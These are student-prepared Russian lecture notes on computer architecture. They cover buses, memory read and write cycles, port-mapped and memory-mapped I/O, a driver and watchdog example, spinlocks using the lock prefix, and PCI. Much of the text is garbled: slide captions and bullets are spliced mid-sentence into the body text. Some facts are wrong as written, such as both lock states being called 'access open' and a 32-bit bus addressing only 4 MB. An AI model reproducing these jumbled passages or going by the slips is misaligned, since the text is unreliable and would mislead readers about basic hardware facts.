        – некоторое              ЦПУ
                    вспомогательное    и оперативной
                                    устройство,            памяти передачу
                                                которое обеспечивает
данных.
   • Шина – набор проводов используемых для передачи
       данных, адресов,
   Рассмотрим               управляющих
                 взаимодействие             сигналов. памятью. Процессор видит
                                  шины с оперативной
некоторый интерфейс шины, за которым может скрываться как прямая линия передачи,
   • Шины, как правило, используются несколькими
так и некая совокупность, объединенная мостами.
       устройствами.
      ЦПУ

                                  Регистры


                                             АЛУ
                                                   Системная (локальная) шина
                                                                    Шина памяти


                                                            Мост
                                                                                         Оперативная
                 Интерфейс шины                            ввода/
                                                                                           память
                                                           вывода

                                                                                                   3
                            Рис. 21.2: Типовое соединение ЦПУ и оперативной памяти

   Определение. Шина – набор пробоводов, используемых для передачи электрических
сигналов, кодирующих данные, адреса, управляющие сигналы. Управляющие сигналы
говорят, какое действие надо совершить с помощью шины.
   Для работы с оперативной памятью всего два действия: чтение и запись.

   Шина может использоваться группой устройств. В этом случае шина – некоторая
среда передачи сигналов, через которую эти сигналы слышны всем абонентам, которые
могут обратиться к шине. То есть любой сигнал, который передается через шину слышем
всем подключенным абонентам. Из-зи этой особенности нужно синхронизировать работу



                                                     218
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




подключенных устройств, чтобы они не мешали друг другу.

   Обращение к памяти за данными. При обращении к памяти за данными на
интерфейс шины попадает обращение, которое выражается внутри команды адресным
кодом dword [A]. Из некоторого адреса извлекаются данные, которые ©затем     будут
                                                                   2021 МГУ/ВМК/СП

переданы процессору.
                                  Чтение данных из памяти (1)
   Рассмотрим обращение к памяти за данными. Чтение данных из памяти:

  1. на интерфейс шины попадает адрес А того места памяти, к которому хотим
      • ЦПУ передает адрес A интерфейсу шины памяти.
     обратиться ;

  2. этот адрес проходит по шине, доходит через цепочку контроллеров до оперативной
     памяти;

                                   Регистры                    Инструкция загрузки данных:
                                                                mov eax, dword [A]
                                               ЦПУ
                             eax

                                                                                Оперативная память
                                                     Мост ввода/вывода                         0
                                                                           A
                       Интерфейс шины                                                      x      A



                                              Рис. 21.3: Чтение данных 1                                    4



  3. оперативная память получает запрос на выборку данных по адресу А из шины,
     осуществляет выборку значения x, и отправляет его назад в шину;

  4. по шине обратно поступают данные поступают на интерфейс, через который эти
     данные попадают на соответствующие линии процессора;

  5. ЦПУ считывает значение x из щины, которое было в оперативной памяти, и
     посылает его в регистр, в данном случае в регистре eax.

   При записи в память работа шины несколько меняется. Запись данных в память:

  1. ЦПУ передает испольнительный адрес А интерфейсу шины ;

  2. оперативная память считывает адрес и ждет посылки соответствующего значения;

  3. вслед за адресом отправляется то значение, которое будет помещаться в устройство,
     поключенное к шине;



                                                         219
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
          • ЦПУ считывает двойное слово x из шины и пересылает его
            в регистр eax.
Архитектура ЭВМ и язык ассемблера                                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU

                                                                                                       © 2021 МГУ/ВМК/СП


                                    Запись данных в Инструкция
                                    Регистры
                                                    память         (2)данных:
                                                               загрузки
                                                                 mov eax, dword [A]
                                                ЦПУ
                              eax      x

                                                                                Оперативная память
                                                      Мост ввода/вывода                        0
          • ЦПУ передает значение y интерфейсу шины.
                        Интерфейс шины                                                      x      A



                                               Рис. 21.4: Чтение данных 2
                                                                                                                6

                                    Регистры                    Инструкция выгрузки данных:
                                                                 mov dword [A], eax
                                                ЦПУ
                              eax      y

                                                                                Оперативная память
                                                      Мост ввода/вывода                        0
                                                                            y
                        Интерфейс шины                                                             A


                                                Рис. 21.5: Запись данных
                                                                                                               8


  4. оперативная память получает двойное слово y из шины и сохраняет его по адресы
     А.

Информация, проходящая по шине в случае чтении и записи, различается. Кодируется,
какая была совершена операция, указывается адрес, указываются значение, которые
передаются.
    На физическом уровне такого рода пересылки могут происходть параллельно по
нескольким линиям в параллельной шине, либо последовательно по одному проводнику
– последовательная шина.


Организация ввода/вывода через пространство портов и через
память.
   Рассмотрим основные принципы подключения устройств к системной шине.
Процессор в первую очередь видит основную, системную шину, которая к нему
подключена. Он работает с ней в некотором адресном пространстве. Возникает вопрос,
как воздействовать на остальные периферийные устройста, не являющиеся памятью,
обращени к которым идет не по номерам ячеек.

  1. Port IO. Введение некоторого дополнительного пространства, к которому можно
     адресоваться. Характерно для архитектура X86.



                                                          220
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




     Помимо памяти, пространства с одномерной адресацией, вводятся порты
     ввода/вывода, которые представляют некоторый одномерный массив некоторых
     ячеек, к которым можно обратиться (16-ти разрядное пространство). Вводится
     дополнительная категория двухадресных команд(две команды):IN, OUT. В них
     задается номер порта и значение, которое записывается в порт, либо считывается в
     заданный операнд.


     Для команды IN в первый операнд считываем информацию из порта, указанного
     во втором операнде, а для команды OUT в порт, указанный в первом операнде
     записываем информацию, записанную во вотором операнде.


     Порты заведены на определенные регистры переферийных устройств. Обращение
     к какому-либо порту приводит к тому, что запись или чтение оправится в
     управляющий регистр или статусный регистр. В управляющий регистр можно
     записать некоторую величину, поменяв порядок работы того или иного устройства.
     При считывании состояния статусного регистра, можно узнать, в каком состоянии
     находится устройство. Например, можно следить за ходом приема/оправки
     информации.


     Плюс: память не перекрывается, что удобно в случае, когда мало оперативной
     памяти.

  2. Memory Mapped IO. Отображенный в память ввод/вывод. Все управляющие
     регистры устройств отображаются на определенные адреса оперативной памяти.
     - Требуется определенная настройка контроллера памяти, чтобы ему было
      известно, что поределенные адреса связаны не с ячейками оперативной памяти, а с
      регистрами того или иного устройства.
     - При попытке обращения в оперативную память мы попадаем в те же регистры
      ввода/выводы.
     - Перекрытая память не используется.
     - Существенно более высокая производительность.

  Шина. Точка зрения системного программиста. Системный программист видит
шину как некое адресное пространсво, которое он может сконфигурировать.

   Для системной шины, через которую идет обращение к оперативной памяти, важна
настройка, как в адресах потенциально адресуемых ячеек будет размещено содержимой
дополнительных устройств.




                                        221
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                            КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                 ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                  СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Шина. Точка зрения системного программиста




                                  Рис. 21.6: Адресное пространство

   С некоторого базового адреса 40000000 располагается оперативная память, часть
младших адресов соотнесена с микросхемой флэш-памяти, внутри которой находилось
некоторое количество определенных разделов:

   • загрузчик

   • дополнительное программное обеспечение

   • блок данных, содержащих специализированную для Flash файловую систему

   • защищенная зона

Информация считывается и записывается как в память, но на самом деле все обращения
идут в дополнительную микросхему, содержащую флэш память.
    Таким образом на шину может быть подсоединена не только флэш-память, но и USB-
контроллеры, контроллеры сетевых адапторов и т.д.
    В данном случае указана 32-х разрядная шина, которая позволяет адресоваться к чему-
то а интервале от 0 до 4 Гб.
    Пример. Рассмотрим кусок кода из реального драйвера сетевой карты в операционной
системe LINUX.
    Есть три параметра: некоторая струкура device, дальше передаются два параметра с
указанием некоторого буфера данных, с указанием его размера. Задача – передать эти
данные через сетевую карту.


                                                222
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU



                                                                                © 2021 МГУ/ВМК/СП


            int device_driver_transmit_data(device *dev,
                                            phys_addr_t *buffer,
                                            size_t buf_len)
               {
                       offset_t offset = device->offset;
                       uint32_t status;
                       time_t time = 0;
                       outl(offset + BUFFER_REGISTER, buffer);
                       outl(offset + BUFLEN_REGISTER, buf_len);
                       outl(offset + COMMAND_REGISTER, COMMAND_TRANSMIT);
                       do {
                               wait(WAIT_INTERVAL);
                               time += WAIT_INTERVAL;
                               inl(&status, STATUS_REGISTER);
                               if ((status & ERROR_MASK) || (time >= TIMEOUT))
                                       goto error;
                       } while (!(status & COMPLETE_MASK));
                       return 0;
                       error:
                       return -1;
                                         void outl(int* m_reg, int val) {
               }
                                            *m_reg = val;
                                         }                                  12



                                  Рис. 21.7: Пример кода


   • Вытаскивается базовый адрес, начиная с которого в памяти размещены
     отображенноые регистры сетевого адаптера.

   • Присутствуютт регистр в котором будет задаваться адрес того буфера, который
     хотим переслать; еще 32-х разрядный регистр, в котором будет помещаться длина
     того буфера, который будет использоваться; регистр команды и статусный регистр,
     с помощью которого будем следить за ходом пересылки.

   • Обращение к сетевому адаптеру: к базовому адресу добавили некоторое смещение,
     относящееся к регистру буфера, другое смещение, относящееся к регистру длины.
     Что-то по этому адресу записали. Потом передали команду.

   • Начался цикл ожидания, в котором мы некоторое время ждем, а затем опрешиваем
     статусный регистр и смотрим, не случилась ли ошибка при передаче, не превышено
     ли время ожидания, которое было зарезервировано на передачу данных. Это
     продолжается до тех пор, пока где-то в статусном регистре появится взведенный
     флаг, показывающий, что передача прошла.




                                           223
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Пример устройства на шине: WatchDog.                                                                  © 2021 МГУ/ВМК/СП



                        Пример простейшего периферийного
   Рассмотрим пример простейшего периферийного устройства, так называемой
сторожевой собачки.
                       устройства: WatchDog @ SoC Exynos4210




      Базовый адрес 0x10060000                                                      Запуск устройства
                                                                                    WTCON[0] = 1
      Регистр                     Смещение   Описание                               WTCON[5] = 1
      WTCON                       0x0        Управляющий регистр
      WTDAT                       0x4        Начальное значение счетчика
      WTCNT                       0x8        Счетчик таймера                                                 13


                                        Рис. 21.8: WatchDog @ SoC Exynos4210

   В данном случае это не отдельный процессор, а целая система на чипе. Помимо
процессора на общей подложке размещено много всего (так дешевле). Для мобильных
телефонов характерно присутствие сторожевых собачек. Это специальные устройства,
которые позволяют отправить компьютер в перезагрузку, если что-то пошло не так,
например, ошибка в операционной системе.

   Устройство:

   • Регистр, который на каждом такте работы уменьшается на 1. Таким образом можно
     записать начальное состояние счетчика, который живет в собачке. Когда счетчик
     достигнет 0, устройство запустит сигнал на перезагрузку. Если система не хочет
     принудительно перезагружаться, она время от времени обращается в собачке и
     пеставляет значение счетчика через регистр WTDAT.

   • Через управляющий регистр WTCON можно выбрать, насколько быстро счетчик
     бцдет сбрасываться до 0.

   • Через 3 и 4 биты управляющего регистра можно управлять мультиплексором,
     который позволит сократить скорость на уменьшение счетчика


                                                         224
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                 КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                      ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                       СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • Через 1 и 2 бит управляющего регистра можно установить возможность, чтобы при
     достижении 0 счетчиком выдавалось прерывание.

   После базового адреса расположены три регистра, записывая и считывая из которых,
можно следить за работой периферийного устройств.


Физические принципы устройства шин. Основные характеристики
шин.
   Рассмотрим шину с точки зрения разработчика аппаратуры. Шина – совокупность
проводов, по которым должны правильно проходить сигналы. Т.е. в определенные
моменты времени должны осуществляться скачки с низкого уровня напряжения
на высокий, должен быть задан порядок кодирования информации изменениями
напряжения, должно быть обеспечено корректное распространение сигнала по длинным
проводникам (порядка десятка сантиметров).
   В шине могут быть выделены

   • управляющие линии,

   • линии адреса,
                                                                                © 2021 МГУ/ВМК/СП
   • линии данных.
                                  Шина: точка зрения разработчика аппаратуры




                                                                                       14


                                                Рис. 21.9: Шина

   Характеристики шин:

   • Ширина. Количество линий, линии адреса, линии данных, мультиплексирование
     адресов и данных



                                                     225
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                      КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                           ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                            СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • Частота – сугубо физический аспект, связанный с тем, какие стробирующие
     сигнали на самом низком уровне проходят.


     ⇒ первые две характеристики влияют на то, какая пиковая пропускная способность
     шины будет обеспечиваться.

   • Пиковая пропускная способность вычисляется как произведение ширины
     (байты или биты) и частоты (1/сек). Эта частота почти не достигается. При
     мультиплекировании адресов и данных часть времени будет затрачена на передачу
     служебной информации.

   • Арбитраж – это тот, как принимается решение, кто будет пользоваться шиной.
     Электрические сигналы идут с конечной скоростью, поэтому одно устройство
     может обратиться к шине, а другое устройство, еще не зная, что первое к
     ней обратилось, тоже может к ней обратиться. одновременное обращение
     нескольких устройств может привести к коллизии доступа. При разработке шины
     в зависимости от топологии связей внутри шины, решается, как понять, какое
     устройство может захватить шину и как остальные устройства будут узнавать, что
     шина занята/свободна.

            – Централизованный. Шины могут иметь топологию ”звезда когда несколько
              абонентов подключены к некоторому центральному устройству, контроллеру.
              Т.е. физически присутствуют несколько выделенных линий для отдельных
              подключенных устройств. Центральный контроллер распределяет, как пойдут
              данные между этими абонентами.
            – Децентрализованный. Шина представляет сойбой полно связанный граф. Чем
              больше элементов связывает такая шина, тем больше физических связей в
              таком графе присутствуют.

   • Возможность горячей замены устройства

   • Физическая организация – Выделенные линии данных, адресов, команд –
     Мультиплексированные линии – Топология связей – Синхронная/асинхронная
     – Ограничения по длине лини


Развитие системы связанных шин персональных компьютеров
  На момент возникновения 32-х разрядной архитектуры , архитектура состояла из двух
шин:

  1. локальная шина – 32-х разрядная (обращение максимум к 4 мб) шина на линии
     процессора, через которую доступна оперативная память. Этой шиной управляла


                                          226
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                              КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                   ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                    СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                     Рис. 21.10: пример 32-х разрядной архитектуры с двумя шинами


     группа микросхем (чипсет), тактовая частота определялась некоторым внешним
     тактовым генератором. На локальной шине сидел мост, корорый позволял
                                                                    16    сопрячь
     локальную шину с более медленной шиной ISA.

  2. шина ISA (Industry Standard Architecture) – это 16-ти разрядная шина, к которой
     подключались устройста ввода/вывода, микросхемы, содержащие в себе
     загрузчикЮ жесткие диски и т.д. Шина ISA – некоторая стандартизированная шина,
     спецификация которой была доступна сторонним разработчикам, что позволяло
     им самостоятельно выпускать устройства, который можно было устанавливать в
     слоты расширения, подключать. Это вызвало возникновение конкурентной среды,
     которая способствовала развитию архитектуры персональных компьютеров.

   В 1990-х требования увеличения скорости и памяти и уменьшения размера устройства
привели к архитектуре, в которой несколько процессоров связывались с внешним миром
через фронтальную шину (см. рис. 21.11).                          © 2021 МГУ/ВМК/СП




                                                                                      17

                                    Рис. 21.11: архитектура 1990-х




                                                 227
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                              КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                   ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                    СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • Фронтальная шина идеологически не отличается от локальной шины. Отличие
     заключчаются в том, что стробирующий сигнал гарантированно шел с
     определенным множителем. Она могла соединять между сосбой пару процессоров
     и обеспечивала связь с чипсетом.

   • Чипсет уже имеет два моста:

            – северный мост отвечает за ввод/вывод. Он связан с оперативной памятью и
              графическим адаптером (нужна максимальная частота)
            – южный мост обеспечивал взаимодействие с более медленными устройствами:
              шина PCI, PCI-Express, жесткие диски, USB-устройства.

     За самые медленные устройства (клавиатура, мышка) отвечал мультиконтроллер,
     который подключался вместе с постоянной памятью к шине LPC

   Затем на основном кристалле была сформирована некоторая система. Современный
64-х разрядный процессор – это система на чипе, которая состоит из нескольких
вычислительных ядер, контроллера памяти, контроллера графического адаптора и т.д.
части, требующие высокую пропускную способность и передачу большого объема
                                                                                © 2021 МГУ/ВМК/СП




                                                               Пример:
                                                               платформа Haswell, 2013




                                                                                       18



                                  Рис. 21.12: платформа Haswell, 2013

данных размещены на кристалле процессора, остальное обслуживается через Platform
Controller Hub.




                                                 228
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                        КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                             ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                              СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Примеры шин: фронтальная шина
   Фронтальная шина:

   • HyperTransport (HT), апрель 2001, AMD. Открытый стандарт - HyperTransport
     Technology • 2 – 32 разряда, двунаправленная • 200 – 2600 MHz, DDR • В 2017 году
     на смену HT пришла шина следующего поколения – Infinity Fabric

   • QuickPath Interconnect (QPI), ноябрь 2008, Intel • 20 линий, двунаправленная, 4 такта
     = 64 бита • 2.4, 2.93, 3.2 GHz, DDR • В 2017 году на смену QPI пришла шина
     следующего поколения – Intel Ultra Path Interconnect (UPI) в процессорах Skylake
     EX/EP Xeon.

   Фронтальная шина обеспечивает соединение точка-точка. Так как связываются ядер
процессора, требуются высокие частоты и выделенные линии связи, которые не будут
блокировать взаимодействие ядер.
⇒ не требуется арбитраж, так как между каждой парой ядер присутствует физический
проводник. Чем больше ядер, тем больше связей в полносвязном графе.
   Разрядность таких шин может варьироваться.Частоты растут.

   Такие шины двунаправленные, т.е. каждое подключенное процессорное ядро может
как отправлять, так и получать данные.


Синхронизация обращений к памяти
    Синхронизация обращений к памяти – важное свойство шины, связывающей ядро
с памятью.
    В силу того, что в процессоре присутствют много ядер, возникает необходимость
организации одновременной параллельной работы программ, выполняющихся
одновременно на нескольких ядрах. Может возникнуть ситуация обращения нескольких
ядер к общим данным, находящимся в оперативной памяти. Для этого необходимы
механизмы синхронизации.
    Рассмотрим конструкцию с замком, который имеет два состояния:
0 – доступ открыт
1 – доступ открыт
В зависимоси от значения замка выполнение на ядре либо находится в бесконечном цикле,
либо может продолжаться. С помощью таких замков формируются критические секции в
коде. С помощью запрашивания замка кусок кода делается недоступным для обращения
других ядер.
    Рассмотрим кусок кода, в котором запрашивается замок. В данном цикле выполняется
одна команда (см. рис. 21.13 )



                                          229
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   Разберем команды BTS( Bit Test and Set) и BTR (Bit Test and Reset). В обоих случая два
опреанда: регистр/память , регистр/непосредственно закодированная величина.
   Во втором операнде задается некоторый бит, который будет отправлен во флаг CF.

   • В случа команды set этот бит будет заведен ( бит ← 1).

   • В случае команды reset этот бит будет сброшен до 0 ( бит ← ∅ ).

    Попадаем в цикл. Если никто еще не захватил однобайтовую переменную, в
 первой команде значение нулевого бита из переменной замка отправляется в СF в
 предположении, что замок был нулевой. Затем проверяется, заведен ли флаг CF.
- Если замок был нулевой, это условие не выполняется, мы выходим из функции.
- Если замок уже захвачен, команда BTS запишет туда единицу и поместит ранее
 записанную единицу в флаг CF, который нас отправвит на следующую итерацию циклу.
    Команда BTR отвечает за освобождение замка. В нулевой разряд записывается ноль.
 Таким образом решается проблема синхронизации.

   Гонка. Может быть ситуация, когда два ядра пытаются захватить замок одновременно.
Это может произойти следующим образом:

   • ядро1 обратилось в память, запрросило текущее состояние замка;

   • ядро1 посмотрело полученное значение и переслало полученное значение в CF ;

   • ядро1 фиксирует свое выполнение, отправляя в память новую величину, где нулевой
     бит уже взведен

   • в ядре2 в это же время происходит чтение с небольшим наложением. В момент,
     когда результат выполнения команды BTS с ядра1 еще не зафиксирован, вторая уже
     запроашивает содержимое замка. ⇒ оба ядра получат начальное значение замка с
     нулевым битом . Получаем состояние гонки.




                                  Рис. 21.13: Состояние гонки


   Захват шины данных. Чтобы избежать состояние гонки, нужно ввести захват шины
данных. Для этого вводится дополнительный префикс lock, который гарантирует, что в



                                             230
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                           КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                 СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




момент времени, когда выполняется одна команда, другие команды не могут использовать
шину данных на чтение/запись. Выполнение команд на ядре2 бкдетдожидаться момента,
когда на ядре1 BTS закончится и зафиксирует свои результаты, поместив в память.




                                  Рис. 21.14: Захват шины данных

    Вывод: для корректного функционирования шины в многоядерном устройстве
необходима аппаратная возможность блокировать шину.
    Пример функции захвата замка. Преобразуем ранее написанный цикл, вытащив
первую итерацию в виде отдельной процерки. Проверяется, что в замке находится
нулевой бит. Если нет, оказывается на команде ret. Если нужно ждать, в тело цикла
добавляется команда pause, которая подстказывает процесору, что мы находимся в цикле
активного ожидания. Это помогает экономить энергию. В этом состоянии находмся пока
не получим нулевой бит в замок.

   В современных процессорах команда pause используется как подсказка, что
выполнение находится в цикле активного ожидания (busy wait)




 acquireLock:                      • Явно указываемый префикс lock. Применим только
    lock bts byte [L], 0             к некоторым командам ADD, AND, BTC, BTR, BTS,
    jc .retry                        CMPXCHG, ...
    ret                              Первый операнд команды – память
  .retry:
    pause                          • Все время выполнения команды процессор удерживает
    lock bts byte [L], 0             шину памяти, посылая на нее сигнал #LOCK
    jc .retry                      • Постоянный захват шины негативно сказывается на
    ret                              производительности


ОС Linux использует для реализации активного ожидания не bts/btr, а гораздо более
быструю команду cmpxchg.



                                               231
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Примеры шин: PCI.
   Появилась в 1990-х годах. Общая шина ввода/вывода для подключения периферийных
устройств Peripheral component interconnect (PCI), 1992, Intel, открытый стандарт.

   • PCI 1.0 / 2.0

            – Шина содержала 32 линии
            – Передача данных шла транзакциями или пакетами, возможна была
              приостановка передачи
            – частота 33 MHz

   • Расширения

            – PCI 64, PCI 66, PCI 64/66, PCI-X (266 и 533 МГц)

   • PCI Express (PCI-E), июль 2002, Intel

            – Топология – звезда, подключение устройств через двунаправленные
              соединения различной ширины. Ширина обозначется символом x. Каждая
              линия(x1) – 4 проводника, потому что передача осуществляется в двух
              направлениях. Передача является полнодуплексной. Дополнительный
              множитель возникает из-за того, что передача сигнала в направлении
              реализуется через дифференциальную пару. Пара проводников позволяет
              снижать зашумленность линии: gо одной линии идет одычный сигнал, а по
              другой – инвертированный.
              Проводни бывают различной ширины: x1, x2, x4, x8, x12, x16, x32
            – Скорость работы соединения варьируется – 2.5, 5.0, 8.0 и 16GT/s (32GT/s в PCI
              5.0) , T/s - передач по шине в секунду
            – Избыточное кодирование данных, 128b/130b в PCI 3.0 и более новых, 8b/10b –
              в старых версиях шины. Т.е. число избыточных данных уменьшилось.

   Все спецификации заведены на величину GT/s (gigatransfers per second). Пересылки
транзакций в секунду. Транзакция – пересылка одного разряда.
   Идентификация (адресация) PCI-устройств. Используется 16 разрядов, которые
делятся следующим образом:

   • первые 13 разрядов задают физическое устройство, которое может быть включено
     в компьютер

            – первые 8 разрядов описывают номер шины
            – следующие 5 разрядов описывают номер устройства


                                             232
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                        КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                             ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                              СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • последние 3 разряда кодируют номер функции

   Преимущества PCI:

   • стандартизация статусных и управляющих регистров, которые составляют
     суммарно 256 байт

            – первый 16-ти разрядный регистр описывает идентификатор производителя
            – следующие 16 описывают идентификатор устройства
            – регистр для команд
            – регистр для статуса
                  ...
            – регистры, которые позволяют задавать базовые адреса в памяти

   • Регистры первых 64 байт стандартизированы

   • Чтение и запись в регистры

            – В начальный момент времени доступен механизм работы с PCI-устройствами
              через порты ввода/вывода. На порт номер 0xCF8 завернут в PCI-контроллете
              регистр, задающий адрес, а на порт ноемр 0xCFC завернут регистр,
              позволяющие обращаться за данными или записывать данные. командами IN
              и OUT
            – Через отображение регистров PCI-устройства в 4КБ адресного пространства
              памяти (зависит от реализации…) В адресном пространстве «теряется» 256
              МБ памяти.

Можно опросить все возможные функци1 возможных устройств последовательно
опросить и создать картину того, что подключено ы системе. Затем распределять
диапазоны адресов памяти и и.д.
   После этой первичной настройки можно отобразить весь комплект регистров в
оперативную память. Т.к. задание дополнительных атрибутов для памяти связано не
с реальной физической оперативной памятью, а с гранулярностью в 4 КБ, которые
